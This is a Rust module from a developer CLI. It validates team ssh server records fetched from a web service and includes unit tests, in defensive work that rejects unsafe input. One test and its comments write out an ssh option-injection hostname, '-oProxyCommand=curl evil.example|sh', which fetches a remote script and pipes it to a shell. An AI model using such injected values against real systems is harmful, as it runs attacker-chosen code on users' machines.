//! The team's servers: addresses riabuild-web holds and this laptop reads.
//!
//! Note what is absent, as in [`crate::org`] — an address, and nothing that
//! runs. What arrives here reaches an `ssh` argv, which is why every rule
//! riabuild-web enforces on the way in is enforced again on the way out.
//! `org::version_only` is the precedent and the reason: the client-side check
//! exists so the CLI survives a server that forgets its own.

use crate::ApiClient;
use anyhow::Result;
use serde::Deserialize;

/// One of the team's servers, as riabuild-web describes it.
///
/// `id` is the riabuild-web row id, and it is what a laptop keys its own state
/// by — so it has to stay stable across a rename *and* across an address edit,
/// which is what a row id is and what a name or an address hash is not.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SharedServer {
    pub id: String,
    pub name: String,
    pub host: String,
    pub port: u16,
    pub user: String,
}

/// What one fetch produced: the servers this laptop may use, and one sentence
/// per server it refused.
///
/// Two fields rather than a `Vec` and a silent filter, for the same reason
/// `render::hints` only prints commands that would work: a server that has
/// quietly vanished from a developer's picker is a support ticket, and the
/// reason it went is the whole content of the answer.
#[derive(Debug, Clone, Default)]
pub struct Fetched {
    pub servers: Vec<SharedServer>,
    pub refused: Vec<String>,
}

/// The wire shape.
///
/// `port` is an `i64` here and a `u16` in [`SharedServer`] on purpose. A row
/// carrying `70000` would fail to deserialize straight into a `u16`, and serde
/// fails the *whole reply* — so one bad row typed by one lead would empty every
/// developer's picker rather than dropping itself. Narrowing happens in
/// [`usable`], one server at a time.
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
struct WireServer {
    #[serde(default)]
    id: String,
    #[serde(default)]
    name: String,
    #[serde(default)]
    host: String,
    #[serde(default)]
    port: i64,
    #[serde(default)]
    user: String,
}

#[derive(Debug, Clone, Deserialize)]
struct Reply {
    #[serde(default)]
    servers: Vec<WireServer>,
}

/// What riabuild-web prefixes nothing with and this laptop prefixes everything
/// shared with. A name that already starts with it would read as
/// `shared-shared-gpu`, or worse, as a local server of the same name.
const DISPLAY_PREFIX: &str = "shared-";

/// One server, checked. `Err` is the sentence the developer is shown.
///
/// The rules match `convex/sharedServers.ts` exactly. Three are shape; the
/// fourth is not:
///
/// **A hostname may not begin with `-`.** riabuild runs `ssh` through
/// `CommandRunner` with an argv and no shell, so there is nothing to inject
/// into — but `ssh` reads a leading-dash argument as an *option*, and
/// `-oProxyCommand=…` sitting where a hostname goes runs a command of the
/// server's choosing on this laptop. That is riabuild-web deciding what code
/// runs here, which is the one boundary the whole design exists to keep shut.
fn usable(wire: &WireServer) -> Result<SharedServer, String> {
    let name = wire.name.trim();
    let host = wire.host.trim();
    let user = wire.user.trim();

    if wire.id.trim().is_empty() {
        return Err(format!("{name:?} arrived without an id"));
    }
    if name.is_empty() || name.len() > 32 || !name.chars().all(is_label_char) {
        return Err(format!("{name:?} is not a usable server name"));
    }
    if name.to_ascii_lowercase().starts_with(DISPLAY_PREFIX) {
        return Err(format!(
            "{name:?} already starts with {DISPLAY_PREFIX:?}, which riabuild adds itself"
        ));
    }
    if host.starts_with('-') {
        return Err(format!(
            "{host:?} would be read as an ssh option, not a hostname"
        ));
    }
    if host.is_empty() || host.len() > 253 || !host.chars().all(is_host_char) {
        return Err(format!("{host:?} is not a hostname"));
    }
    if !(1..=65535).contains(&wire.port) {
        return Err(format!("{} is not a port number", wire.port));
    }
    if user.is_empty() || user.len() > 32 || !user.chars().all(is_label_char) {
        return Err(format!("{user:?} is not a username"));
    }

    Ok(SharedServer {
        id: wire.id.trim().to_string(),
        name: name.to_string(),
        host: host.to_string(),
        // Checked immediately above, so this cannot truncate.
        port: wire.port as u16,
        user: user.to_string(),
    })
}

fn is_label_char(character: char) -> bool {
    character.is_ascii_alphanumeric() || matches!(character, '-' | '_' | '.')
}

fn is_host_char(character: char) -> bool {
    character.is_ascii_alphanumeric() || matches!(character, '-' | '.')
}

/// `GET /api/v1/remotes/shared`.
///
/// Fails only when the request or the reply's *envelope* did; a server inside
/// it that this riabuild will not use is refused individually, so one address
/// nobody can connect to never costs a developer the rest of the list.
pub async fn fetch_shared(api: &ApiClient) -> Result<Fetched> {
    let reply: Reply = api.get_json("/api/v1/remotes/shared").await?;
    Ok(sort_out(reply.servers))
}

fn sort_out(wire: Vec<WireServer>) -> Fetched {
    let mut fetched = Fetched::default();
    for server in wire {
        match usable(&server) {
            Ok(server) => fetched.servers.push(server),
            Err(reason) => fetched.refused.push(reason),
        }
    }
    fetched
}

#[cfg(test)]
mod tests {
    use super::*;

    fn wire(host: &str) -> WireServer {
        WireServer {
            id: "k17abc".into(),
            name: "gpu".into(),
            host: host.into(),
            port: 2222,
            user: "ada".into(),
        }
    }

    fn named(name: &str) -> WireServer {
        WireServer {
            name: name.into(),
            ..wire("gpu.internal")
        }
    }

    #[test]
    fn an_ordinary_server_is_accepted_whole() {
        let server = usable(&wire("gpu.internal")).expect("usable");
        assert_eq!(
            server,
            SharedServer {
                id: "k17abc".into(),
                name: "gpu".into(),
                host: "gpu.internal".into(),
                port: 2222,
                user: "ada".into(),
            }
        );
    }

    #[test]
    fn a_hostname_that_ssh_would_read_as_an_option_is_refused() {
        // The one that matters. riabuild runs ssh with an argv and no shell, so
        // there is nothing to inject into — but ssh reads a leading-dash
        // argument as an option, and `-oProxyCommand=…` where a hostname goes
        // runs a command of riabuild-web's choosing on this laptop.
        let refused =
            usable(&wire("-oProxyCommand=curl evil.example|sh")).expect_err("must not be usable");
        assert!(refused.contains("ssh option"), "{refused}");

        // And the case that proves this rule is the one doing the work: every
        // character here is one the charset rule allows.
        let refused = usable(&wire("-gpu.internal")).expect_err("must not be usable");
        assert!(refused.contains("ssh option"), "{refused}");
    }

    #[test]
    fn a_hostname_carrying_a_user_or_a_port_is_refused() {
        // Each part has its own field. A host that swallowed them would hash to
        // a different server than the one the lead described.
        for host in ["ada@gpu.internal", "gpu.internal:22", "gpu internal", ""] {
            assert!(usable(&wire(host)).is_err(), "{host:?} must not be usable");
        }
    }

    #[test]
    fn a_name_that_would_collide_with_the_display_prefix_is_refused() {
        for name in ["shared-gpu", "Shared-Gpu", "SHARED-gpu"] {
            let refused = usable(&named(name)).expect_err("must not be usable");
            assert!(refused.contains("riabuild adds itself"), "{refused}");
        }
        // …but a name that merely contains it further along is fine.
        assert!(usable(&named("gpu-shared-2")).is_ok());
    }

    #[test]
    fn a_port_outside_the_range_is_refused_without_wrapping() {
        // The reason `port` is an i64 on the wire: 70000 as a u16 would not
        // merely be refused, it would fail the whole reply and empty the
        // picker. And a cast without this check would land on 4464.
        for port in [0, -1, 65536, 70000, 4_294_967_296] {
            let server = WireServer {
                port,
                ..wire("gpu.internal")
            };
            let refused = usable(&server).expect_err("must not be usable");
            assert!(refused.contains("port"), "{refused}");
        }
        assert!(
            usable(&WireServer {
                port: 65535,
                ..wire("gpu.internal")
            })
            .is_ok()
        );
    }

    #[test]
    fn a_server_without_an_id_is_refused() {
        // The id is what this laptop keys its own state by; a record keyed on
        // nothing would collide with the next server that also arrived empty.
        let server = WireServer {
            id: "  ".into(),
            ..wire("gpu.internal")
        };
        assert!(usable(&server).is_err());
    }

    #[test]
    fn surrounding_whitespace_is_trimmed_rather_than_refused() {
        // riabuild-web validates the trimmed value and stores what it was
        // given, exactly as `org::version_only` documents for versions — so
        // these are values the server accepts and serves.
        let server = WireServer {
            name: " gpu ".into(),
            host: " gpu.internal ".into(),
            user: " ada ".into(),
            ..wire("gpu.internal")
        };
        let server = usable(&server).expect("usable");
        assert_eq!(server.name, "gpu");
        assert_eq!(server.host, "gpu.internal");
        assert_eq!(server.user, "ada");
    }

    #[test]
    fn one_refused_server_does_not_cost_the_developer_the_rest_of_the_list() {
        let fetched = sort_out(vec![
            wire("gpu.internal"),
            wire("-oProxyCommand=x"),
            WireServer {
                name: "build".into(),
                ..wire("build.internal")
            },
        ]);
        assert_eq!(
            fetched
                .servers
                .iter()
                .map(|server| server.name.as_str())
                .collect::<Vec<_>>(),
            vec!["gpu", "build"]
        );
        assert_eq!(fetched.refused.len(), 1, "{:?}", fetched.refused);
    }

    #[test]
    fn a_reply_decodes_and_an_unknown_field_in_it_is_ignored() {
        // Forward compatibility, the same rule `/api/v1` is held to: a field
        // added later must not break a riabuild released before it.
        let reply: Reply = serde_json::from_str(
            r#"{"servers":[{"id":"k1","name":"gpu","host":"gpu.internal",
                "port":2222,"user":"ada","addedBy":"grace"}],"nextCursor":null}"#,
        )
        .expect("decodes");
        let fetched = sort_out(reply.servers);
        assert_eq!(fetched.servers.len(), 1);
        assert_eq!(fetched.servers[0].port, 2222);
    }

    #[test]
    fn a_reply_with_no_servers_field_at_all_is_an_empty_list() {
        // What a riabuild-web that has not been deployed yet answers, and it
        // must read as "no shared servers" rather than as a broken reply.
        let reply: Reply = serde_json::from_str("{}").expect("decodes");
        assert!(sort_out(reply.servers).servers.is_empty());
    }
}
